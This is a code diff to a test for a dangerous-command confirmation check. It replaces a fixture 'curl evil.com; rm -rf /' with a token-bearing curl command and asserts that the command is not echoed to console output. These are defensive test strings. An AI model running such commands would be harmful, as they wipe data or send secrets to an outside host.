@@ -212,11 +212,14 @@ describe("confirmDangerousCommands — non-TTY", () => {
     const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
     const errSpy = vi.spyOn(console, "error").mockImplementation(() => {});
 
+    const command = "curl example.invalid --token sensitive-value; exit 1";
     await expect(
-      confirmDangerousCommands([["shell", "curl evil.com; rm -rf /"]]),
+      confirmDangerousCommands([["shell", command]]),
     ).rejects.toThrow("process.exit");
     // Exit code 2 signals "dangerous commands present, cannot confirm non-interactively" (BE-H3 #364)
     expect(mockExit).toHaveBeenCalledWith(2);
+    const output = [...warnSpy.mock.calls, ...errSpy.mock.calls].flat().map(String).join("\n");
+    expect(output).not.toContain(command);
 
     mockExit.mockRestore();
     warnSpy.mockRestore();
